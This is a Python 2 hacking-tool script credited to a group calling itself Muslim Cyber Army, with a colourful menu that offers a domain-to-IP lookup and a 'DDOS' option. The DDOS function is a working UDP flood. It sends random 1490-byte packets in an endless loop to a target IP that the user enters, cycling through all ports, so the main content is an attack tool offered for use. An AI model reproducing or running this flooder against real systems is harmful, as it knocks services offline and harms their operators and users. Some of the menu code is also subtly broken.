#!/usr/bin/python2
# coding: UTF-8
# created    : Tegar ID
# time       : 08:10
# date       : 29 November 2020
# file name  : MCA.py
# Team       : (MCA) Muslim Cyber Army 
# versi      : 1.0

# import libraries
import socket
import subprocess
import os
import sys
import time
import mechanize
import itertools
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from datetime import datetime


# banner
logo = """\033[31;1m       ___ ___    __   ____ 
      |   |   |  /  ] /    |
      | _   _ | /  / |  o  |
\033[37;1m      |  \_/  |/  /  |     |
      |   |   /   \_ |  _  |
      |   |   \     ||  |  |
      |___|___|\____||__|__|
                      
    [\033[41;1m Muslim Cyber Army Team \033[00;1m\033[37;1m]
\033[37;1m[\033[31;1m*\033[37;1m] \033[31;1mCreated By Tegar ID
\033[37;1m[\033[31;1m*\033[37;1m] \033[31;1mTeam : Muslim Cyber Army
"""

logo1 = "[\033[41;1m ScanDomain \033[00;1m\033[37;1m]"

logo2 = "[\033[41;1m DDOS MCA \033[00;1m\033[37;1m]"
# aktivitas membersihkan layar
subprocess.call('clear', shell=True)

# menu activity
def menu():
    print "\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"+30*"─"+"\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"
    print "  \033[37;1m{\033[31;1m1\033[37;1m} \033[31;1mScan Domain"
    print "  \033[37;1m{\033[31;1m2\033[37;1m} \033[31;1mDDOS"
    print "  \033[37;1m{\033[31;1m0\033[37;1m} \033[31;1mExit"
    print "\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"+30*"─"+"\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"
    print ""
    pilih()

# choose menu
def pilih():
    pilih = raw_input("\033[34;1mmca\033[31;1m@\033[36;1mroot\033[36;1m-#\033[37;1m ")
    if pilih == "":
        print "\033[37;1m[\033[31;1m!\033[37;1m] \033[31;1mnumber", pilih, "not found"
    elif pilih == "1":
        scandomain()
    elif pilih == "2":
         ddos()
    elif pilih == "0":
         sys.exit("exit program")
    else:
         print "not found"
         pilih()
  
# scan domain tools
def scandomain():
    os.system("clear")
    print logo1
    print "\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"+30*"─"+"\033[36;1m[\033[384;1m+\033[36;1m]\033[31;1m"
    # masukan domain
    try:
        server = raw_input('\033[37;1m[\033[31;1m*\033[37;1m] \033[31;1minput domain: \033[37;1m')
        serverip = socket.gethostbyname(server)
        # tampilkan ip
        print "\033[31;1mip", server, "\033[36;1m:\033[3;1m", serverip
        menu()
    except socket.error:
        print '\033[37;1m[\033[31;1m!\033[37;1m] \033[31;1mcek internet anda'
        sys.exit()
 
# ddos tools
def ddos():
    os.system("clear")
    print logo2
    print "\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"+30*"─"+"\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = raw_input('\033[37;1mIP Target : ')
    port = input('\033[37;1mPort       : ')
    os.system('clear')
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print 'Sent %s packet to %s throught port:%s' % (sent, ip, port)
        if port == 65534:
            port = 1
           
if __name__ == '__main__':
    print logo
    menu()
